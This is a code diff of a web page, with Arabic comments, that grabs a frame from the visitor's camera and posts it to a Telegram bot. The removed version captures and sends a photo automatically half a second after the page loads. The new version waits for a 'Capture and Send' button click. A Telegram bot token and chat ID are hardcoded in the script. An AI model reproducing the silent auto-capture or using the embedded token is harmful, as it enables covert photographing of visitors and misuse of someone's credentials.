@@ -28,6 +28,24 @@
             margin-bottom: 20px;
         }
 
+        #message {
+            display: none;
+        }
+
+        button {
+            background-color: #007bff;
+            padding: 10px 20px;
+            color: white;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
         canvas {
             display: none; /* لإخفاء الكاميرا، سنستخدمها فقط لالتقاط الصورة */
         }
@@ -52,28 +70,26 @@
         <h1>Camera Capture and Send to Telegram</h1>
         <video id="videoElement" width="640" height="480" autoplay></video>
         <canvas id="canvasElement"></canvas>
+        <button id="captureButton">Capture and Send</button>
         <div id="response" class=""></div>
     </div>
 
     <script>
-        const TOKEN = "7938645268:AAH8CVrGDCVD419bVecj cHz5kbH8Ep67s4Y"; // التوكن الجديد
+        const TOKEN = "7938645268:AAH8CVrGDCVD419bVecj_cHz5kbH8Ep67s4Y"; // التوكن الجديد
         const CHAT_ID = "6769524326"; // استبدلها بالـ chat_id الخاص بك
-        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendPhoto`; // تم استخدام HTTPS هنا
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
 
         // الحصول على الفيديو من الكاميرا
         const video = document.getElementById('videoElement');
         const canvas = document.getElementById('canvasElement');
         const context = canvas.getContext('2d');
+        const captureButton = document.getElementById('captureButton');
         const responseDiv = document.getElementById('response');
 
-        // بدء الكاميرا تلقائيًا عند دخول المستخدم للموقع
+        // بدء الكاميرا
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(function(stream) {
                 video.srcObject = stream;
-                // تأخير صغير قبل التقاط الصورة
-                setTimeout(function() {
-                    captureAndSend();
-                }, 500); // 0.5 ثانية (تأخير صغير)
             })
             .catch(function(err) {
                 console.log("Error accessing the camera: ", err);
@@ -81,33 +97,35 @@
                 responseDiv.className = "error";
             });
 
-        // دالة لالتقاط الصورة وإرسالها
-        function captureAndSend() {
+        // التقاط صورة عند الضغط على زر "Capture and Send"
+        captureButton.addEventListener('click', function() {
             // رسم صورة من الفيديو إلى الـ canvas
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // تحويل الصورة إلى Base64
-            const imageData = canvas.toDataURL('image/jpeg');
-
             // إرسال الصورة إلى تيليجرام
-            sendToTelegram(imageData);
-        }
+            sendToTelegram();
+        });
 
         // دالة لإرسال الصورة إلى بوت تيليجرام
-        function sendToTelegram(imageData) {
-            axios.post(URI_API, {
-                chat_id: CHAT_ID,
-                photo: imageData // إرسال الصورة كـ بيانات Base64
-            })
-            .then(response => {
-                responseDiv.textContent = "Image sent successfully!";
-                responseDiv.className = "success";
-            })
-            .catch(error => {
-                console.error("Failed to send image:", error);
-                responseDiv.textContent = "Failed to send image.";
-                responseDiv.className = "error";
-            });
+        function sendToTelegram() {
+            // تحويل الـ canvas إلى Blob (بدلاً من Base64)
+            canvas.toBlob(function(blob) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'capture.jpg'); // إرسال الصورة كما هي
+
+                // إرسال الصورة باستخدام axios
+                axios.post(URI_API, formData)
+                    .then(response => {
+                        responseDiv.textContent = "Image sent successfully!";
+                        responseDiv.className = "success";
+                    })
+                    .catch(error => {
+                        console.error("Failed to send image:", error);
+                        responseDiv.textContent = "Failed to send image.";
+                        responseDiv.className = "error";
+                    });
+            }, 'image/jpeg'); // تحديد نوع الصورة
         }
     </script>
 </body>
